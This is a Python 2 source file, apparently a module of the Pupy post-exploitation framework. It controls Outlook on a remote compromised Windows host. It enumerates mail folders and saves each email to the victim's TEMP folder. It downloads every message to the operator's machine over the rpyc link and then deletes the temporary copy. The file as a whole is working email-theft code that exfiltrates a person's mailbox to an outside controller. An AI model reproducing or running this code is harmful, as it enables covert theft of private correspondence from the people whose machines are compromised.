# -*- coding: UTF8 -*-

import os, logging, sys, time
from rpyc.utils.classic import download
from pupylib.utils.term import colorize

class outlook():
	'''
	'''
	
	OL_SAVE_AS_TYPE={'olTXT': 0,'olRTF':1,'olTemplate': 2,'olMSG': 3,'olDoc':4,'olHTML':5,'olVCard': 6,'olVCal':7,'olICal': 8}
	OL_DEFAULT_FOLDERS = {'olFolderDeletedItems':3,'olFolderDrafts':16,'olFolderInbox':6,'olFolderJunk':23,'olFolderSentMail':5}
	
	def __init__(self, module, rootPupyPath, localFolder="output/", folderIndex=None, folderId=None, sleepTime=3, msgSaveType='olMSG'):
		'''
		'''
		self.module = module
		self.outlook = None
		self.mapi = None
		self.localFolder = os.path.join(localFolder, "{0}-{1}-{2}".format(self.module.client.desc['hostname'].encode('utf-8'), self.module.client.desc['user'].encode('utf-8'), self.module.client.desc['macaddr'].encode('utf-8').replace(':','')))
		self.foldersAndSubFolders = None
		self.folderId = folderId
		self.folderIndex = folderIndex
		self.msgSaveType = msgSaveType
		self.inbox = None
		self.constants = None
		self.sleepTime = sleepTime
		self.remoteTempFolder = self.module.client.conn.modules['os.path'].expandvars("%TEMP%")
		self.__connect__()
		if not os.path.exists(self.localFolder):
			logging.debug("Creating the {0} folder locally".format(self.localFolder))
			os.makedirs(self.localFolder)
	
	def __connect__(self):
		'''
		'''
		#self.outlook = self.module.client.conn.modules['win32com.client'].Dispatch("Outlook.Application")
		self.outlook = self.module.client.conn.modules['win32com.client.gencache'].EnsureDispatch("Outlook.Application")
		self.mapi = self.outlook.GetNamespace("MAPI")
		if self.folderId == None : self.setDefaultFolder(folderIndex=self.folderIndex)
		else : self.setFolderFromId(folderId=self.folderId)
	
	def close(self):
		'''
		'''
		logging.debug("Closing Outlook link...")
		self.outlook.Quit()
		
	def __getOlDefaultFoldersNameFromIndex__(self, folderIndex):
		'''
		Return None if folderIndex not found in OlDefaultFolders
		Otherwise returns Name of the folder
		'''
		found = False
		for k in self.OL_DEFAULT_FOLDERS:
			if self.OL_DEFAULT_FOLDERS[k] == folderIndex:
				return k
		return ""
	
	def setDefaultFolder(self, folderIndex=None):
		'''
		See https://msdn.microsoft.com/fr-fr/library/office/ff861868.aspx for folderIndex
		Return True if done
		Otherwise returns False
		'''
		if folderIndex == None: 
			folderIndex = self.OL_DEFAULT_FOLDERS['olFolderInbox']
		folderName = self.__getOlDefaultFoldersNameFromIndex__(folderIndex)
		if folderName == None:
			logging.warning('Impossible to move the default folder to {0}. This folder index is not in {1}'.format(folderIndex, self.OL_DEFAULT_FOLDERS))
			return False
		else:
			logging.debug("Moving outlook default folder to {0}".format(folderName))
			self.inbox = self.mapi.GetDefaultFolder(folderIndex)
			return True
	
	def setFolderFromId(self, folderId):
		'''
		See https://msdn.microsoft.com/fr-fr/library/office/ff861868.aspx for folderIndex
		Return True if done
		Otherwise returns False
		'''
		if folderId == None: 
			logging.error("Impossible to set Outlook folder to None")
			return False
		else:
			logging.debug("Moving outlook default folder to {0}".format(folderId))
			self.inbox = self.mapi.GetFolderFromID(folderId)
			return True
	
	"""
	def getAnEmail(self, nb):
		'''
		nb: number of the email
		nb>=1
		'''
		return self.inbox.Items[nb]
	"""
	
	"""
	def getEmailsWithSubject(self, subject):
		'''
		Returns a list which contains all emails (mailItem objects) when subject is in the email subject
		'''
		emails = []
		for anEmail in self.inbox.Items:
			if subject in anEmail.Subject:
				emails.append(anEmail)
		return emails
	"""
		
	def getEmails(self):
		'''
		Returns a list which contains all mailitems
		'''
		emails = []
		logging.debug("Getting {0} emails...".format(self.getNbOfEmails()))
		for anEmail in self.inbox.Items:
			emails.append(anEmail)
		return emails
		
	def downloadAnEmail(self, mailItem):
		'''
		'''
		ctime, subjectCleaned, receivedTime, path, filename = str(time.time()).replace('.',''), "Unknown", "Unknown", "", ""
		try:
			subjectCleaned = ''.join(l for l in mailItem.Subject.encode('ascii','ignore') if l.isalnum())
			receivedTime = str(mailItem.ReceivedTime).replace('/','').replace('\\','').replace(':','-').replace(' ','_')
		except Exception,e:
			logging.warning("Impossible to encode email subject or receivedTime:{0}".format(repr(e)))
		filename = "{0}_{1}_{2}.{3}".format(receivedTime, ctime, subjectCleaned[:100], 'msg')
		path = self.module.client.conn.modules['os.path'].join(self.remoteTempFolder,filename)
		logging.debug('Saving temporarily the email on the remote path {0}'.format(path))
		#mailItem.SaveAs(path, self.OL_SAVE_AS_TYPE['olMSG'])
		mailItem.SaveAs(path, outlook.OL_SAVE_AS_TYPE[self.msgSaveType])
		try:
			self.module.client.conn.modules['os'].rename(path, path) #test if the file is not opened by another process
		except OSError as e:
			time.sleep(self.sleepTime)
		logging.debug("Downloading the file {0} to {1}".format(path, self.localFolder))
		download(self.module.client.conn, path, os.path.join(self.localFolder, filename))
		logging.debug("Deleting {0}".format(path))
		self.module.client.conn.modules.os.remove(path)
	
	def downloadAllEmails(self):
		'''
		'''
		logging.debug("Downloading all emails")
		for i, anEmail in enumerate(self.getEmails()):
			self.downloadAnEmail(anEmail)
			sys.stdout.write('\r{2}Downloading email {0}/{1}...'.format(i+1 ,self.getNbOfEmails(), colorize("[+] ","green")))
			sys.stdout.flush()
		print "\n"
	
	"""
	def getAllSubjects(self):
		'''
		'''
		subjects = []
		logging.debug("Getting subjects of {0} emails...".format(self.getNbOfEmails()))
		for anEmail in self.inbox.Items:
			subjects.append(anEmail.Subject)
		return subjects
	"""
	
	def getNbOfEmails(self):
		'''
		'''
		#nc = self.inbox.Count
		nb = len(self.inbox.Items)
		logging.debug("Getting number of emails... {0} emails".format(nb))
		return nb
		
	def __getAllFolders__(self):
		'''
		'''
		folders = {}
		for inx, folder in enumerate(list(self.mapi.Folders)):
			logging.debug("New folder: {0}({1})".format(folder.Name, folder.EntryID))
			folders[folder.Name] = {}
			if "Dossiers publics" not in folder.Name and "Public folders" not in folder.Name: #Bug in my version of outlook when getting emails in public folder
				for inx,subfolder in enumerate(list(folder.Folders)):
					logging.debug("{0}->{1} ({2})".format(inx, subfolder.Name.encode('utf-8'), subfolder.EntryID))
					folders[folder.Name][subfolder.Name]=subfolder.EntryID
		return folders
	
	def printFoldersAndSubFolders(self):
		'''
		'''
		foldersAndSubFolders = self.__getAllFolders__()
		for i,folder in enumerate(foldersAndSubFolders):
			print "{0}: {1}".format(i, folder.encode('utf-8'))
			for j,subFolder in enumerate(foldersAndSubFolders[folder]):
				print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
	
	"""
	def __getRecipientsAddresses__(self, RecipientsObject):
		'''
		'''
		recipients = []
		for aRecipient in RecipientsObject:
			recipients.append(aRecipient.Address)
		return recipients
		
	def __getSenderAddress__(self, mailItem):
		'''
		'''
		if mailItem.SenderEmailType=='EX':
			try:
				return mailItem.Sender.GetExchangeUser().PrimarySmtpAddress
			except Exception,e:
				logging.warning("Impossible to get sender email address: {0}".format(e))
		return mailItem.SenderEmailAddress
		
	def printMailItem(self, mailItem):
		'''
		'''
		print "ReceivedTime: {0}".format(mailItem.ReceivedTime)
		#print "Sender: {0}".format(self.__getSenderAddress__(mailItem))
		#print "Recipients: {0}".format(self.__getRecipientsAddresses__(mailItem.Recipients))
		print "Subject: {0}".format(repr(mailItem.Subject))
		print "Body: {0}".format(repr(mailItem.Body))
	"""
